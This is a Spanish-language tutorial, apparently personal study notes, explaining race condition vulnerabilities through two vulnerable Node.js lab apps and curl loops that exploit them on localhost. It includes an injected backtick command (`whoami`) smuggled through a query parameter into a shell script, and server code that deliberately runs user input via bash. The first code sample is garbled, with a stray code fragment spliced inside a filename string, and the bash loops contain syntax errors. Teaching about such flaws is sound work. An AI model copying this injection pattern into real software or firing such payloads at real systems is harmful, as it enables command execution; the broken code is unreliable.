# ¿ Que son las **Race Condition** ? 

Las **condiciones de carrera (Race Condition)** son un tipo de vulnerabilidad que puede ocurrir en sistemas informáticos donde dos o más procesos o hilos de ejecución compiten por los mismos recursos sin que haya un mecanismo adecuado de sincronización para controlar el acceso a los mismos. 

Esto significa que si dos procesos intentan acceder a un mismo recurso compartido al mismo tiempo, puede ocurrir que la salida de uno o ambos procesos sea impredecible, o incluso que se produzca un comportamiento no deseado en el sistema. 

----

# Explotación 

Los atacantes pueden aprovecharse de las condiciones de carrera para llevar a cabo ataques de denegación de servicio ( **DoS** ), sobrescribir datos críticos, obtener acceso no autorizado a recursos, o incluso ejecutar código maliciosos en el sistema. 

Por ejemplo, supongamos que dos procesos intentan acceder a un archivo al mismo tiempo: uno para leer y el otro para escribir. Si no hay un mecanismo adecuado para sincronizar el acceso al archivo, puede ocurrir que el proceso de lectura lea datos incorrectos del archivo, o que el proceso de escritura sobrescriba datos importantes que necesitan ser preservados. 

Este ejemplo, se puede dar con el siguiente código: 

```javascript
// more code ....
app.get("/", (req, res) => {
  let hello = "";
  let action = req.query.action ? req.query.action : "run";
  if (action === "validate") {
    let person = req.query.person ? req.query.person : "Default User";
    let valid = boot_validate(person);
    if (valid == "") {
      boot_clean();
    }
  } else if (action == "reset") {
    boot_clean();
    boot_reset();
    boot_run();
  } else {
    boot_run();
    try {
      hello = fs.readFileSync("hello.tlet person = req.query.person ? req.query.person : "Default User";
    let valid = boot_validate(person);
    if (valid == "") {
      boot_clean();
    }xt", "utf8").toString();
    } catch (error) {
      hello = "Important hello file is missing, please reset.";
      boot_clean();
      boot_reset();
      boot_run();
    }
  }
  res.render("index.ejs", { action: action, hello: hello });
});

const boot_validate = (person) => {
  fs.writeFileSync("hello.sh", 'echo "' + person + '" > hello.txt');
  exec("echo 'hello.sh updated -- " + Date.now() + "' > log.txt");
  exec("echo 'hello.sh cleaned -- " + Date.now() + "' >> log.txt");
  exec("bash hello.sh");
  const valid = () => {
    return execSync(
      "sed -n '/^echo \"[A-Za-z0-9 ]*\" > hello.txt$/p' hello.sh"
    ).toString();
  };
  return valid();
};

const boot_clean = () => {
  exec(`rm hello.txt`);
};

const boot_run = () => {
  exec(`bash hello.sh`);
};

const boot_reset = () => {
  fs.writeFileSync("hello.sh", "echo 'Default User' > hello.txt");
};

// .... more code

```

En este ejemplo tenemos dos funcionalidades muy importantes, la primera es la que se realiza cuando **validate** = 'action'. 

```javascript
let person = req.query.person ? req.query.person : "Default User";
    let valid = boot_validate(person);
    if (valid == "") {
      boot_clean();
}
```

Por lo que se ejecuta la función **boot_validate** con la query **person** recibida que es nuestro input el cual se va a alojar en el archivo **hello.sh** el cual se ejecutara posteriormente luego de validar que solo contenga caracteres alfanuméricos. 

Por otro lado, la funcionalidad importante que tenemos es la que se ejecuta en caso de que nuestra query **validate** no sea ni 'action' ni 'reset', dando el siguiente código: 

```javascript
 boot_run();
    try {
      hello = fs.readFileSync("hello.tlet person = req.query.person ? req.query.person : "Default User";
    let valid = boot_validate(person);
    if (valid == "") {
      boot_clean();
    }xt", "utf8").toString();
    } catch (error) {
      hello = "Important hello file is missing, please reset.";
      boot_clean();
      boot_reset();
      boot_run();
```

En esta también vemos que se ejecuta la función **boot_validate**, si bien esto de primeras este sanitizado, podríamos aprovecharnos de una condición de carrera ya que no esta adecuadamente programado, si bien si ingresamos un comando este se limpia y no se muestra (luego de ejecutarlo), intuimos que por un momento se ejecuta, por lo que si abusando de bucles estamos constantemente leyendo el resultado de la web en donde se lee el contenido hello.txt (Donde se alojaría el output de nuestro comando) a la vez que estamos constantemente ejecutando la petición de la ejecución de un determinado comando, en un punto la aplicación podría tener un fallo ya que ambos procesos, como ocurre en la condición de carrera, están compitiendo por los mismos recursos. 

```bash
# Por un lado estamos constantemente enviando la petición de que se ejecute el comando "whoami"
while true; do curl -s -X GET 'http://localhost:5000/?person=`whoami`&action=validate'; done

# Por otro lado, estamos constantemente leyendo el apartado de la web en donde se vuelca el output de estos comandos (Si se diera la condición de carrera y funciona podriamos llegar a ver el output del comando deseado en algunos momentos)
while true, do curl -s -X GET 'http://localhost:5000/?action=run' | html2text | xargs | grep 'Check this out:' ; done 
```

La prueba y análisis de este código se puede encontrar en este [repo](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/RaceCondition). 

----

En otro ejemplo, tenemos el siguiente código: 

```javascript
// more code ...
app.get("/:value", (req, res) => {
  fs.writeFileSync("shared-file.txt", req.params.value);
  fs.open("shared-file.txt", "r", (err, fd) => {
    let file = fs.readFileSync("shared-file.txt", "utf8");
    res.setHeader("Content-Type", "text/html", "charset=utf-8");
    res.setHeader(
      "Content-Disposition",
      "attachment; filename=shared-file.txt"
    );
    res.sendFile(__dirname + "/shared-file.txt");
  });
});
// ... more code
```

Esto es una web local por el puerto 5000 la cual cuando ingresamos un parámetro x (:value), crea un archivo llamado **shared-file.txt** con el contenido ingresado como parámetro, por lo que si ponemos 'http://localhost:5000/dobliuw', nos intentara descargar un archivo **shared-file.txt** con el contenido *dobliuw*. 

Que pasa con esto? En principio, así como en el caso anterior, de puede acontecer un **Racea Condition** ya que, imaginemos que múltiples usuarios intentan crear su archivo en simultaneo, no solo podría acontecerse un *DoS*, si no que, en algún momento, podría llegar a ver la petición de otros usuarios, descargando así archivos con un contenido distinto al ingresado.

Esto se puede probar haciendo uso de [[Burpsuite]], en donde si preparamos una petición a la url 'http://localhost:5000/burpsuite' y por otro lado desde consola ejecutamos la siguiente línea: 

```bash 
while true, do curl -s -X GET 'http://localhost:5000/dobliuw' | grep -v "dobliuw" ; done
```

Estaríamos tramitando múltiples llamadas de intento de creación del archivo **shared-file.txt** con el contenido **dobliuw**, por lo que si ahora tramitamos la petición de burpsuite, en donde indicamos que (Según el código) queremos crear el archivo **shared-file.txt** con el contenido **burpsuite**, muy posiblemente en algún momento veamos el contenido **dobliuw** en la petición tramitada por [[Burpsuite]] y en la consola veamos el contenido **burpsuite**.  